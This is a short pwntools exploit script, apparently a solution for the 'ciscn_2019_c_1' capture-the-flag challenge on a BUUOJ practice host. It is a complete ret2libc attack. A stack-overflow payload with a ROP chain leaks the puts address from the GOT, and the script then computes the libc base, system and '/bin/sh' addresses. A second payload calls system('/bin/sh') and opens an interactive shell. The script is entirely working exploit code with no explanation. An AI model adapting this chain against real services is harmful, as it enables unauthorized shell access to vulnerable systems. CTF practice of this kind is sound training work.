from pwn import *

from LibcSearcher import *

io = remote('node3.buuoj.cn',29028)

elf = ELF('./ciscn_2019_c_1')
ret =0x4006b9 
main= 0x400b28
rdi = 0x400c83
got=elf.got['puts']
plt = elf.plt['puts']
io.sendlineafter('choice!\n','1')
payload=flat(b'\0',cyclic(0x50-1+8),p64(rdi),p64(got),p64(plt),p64(main))
io.sendlineafter('encrypted\n',payload)
io.recvline()
io.recvline()
puts_addr =u64(io.recvuntil('\n')[:-1].ljust(8,b'\0'))
print(puts_addr)
libc = ELF('libc6_2.27-3ubuntu1_amd64.so')
#libc = LibcSearcher('puts',puts_addr)
base = puts_addr-libc.symbols['puts']
binsh = base+next(libc.search(b'/bin/sh'))
system = base+libc.symbols['system']

io.sendlineafter('choice!\n','1')

payload1 = flat(b'\0',cyclic(0x50-1+8),p64(ret),p64(rdi),p64(binsh),p64(system))

io.sendlineafter('encrypted\n',payload1)
io.interactive()



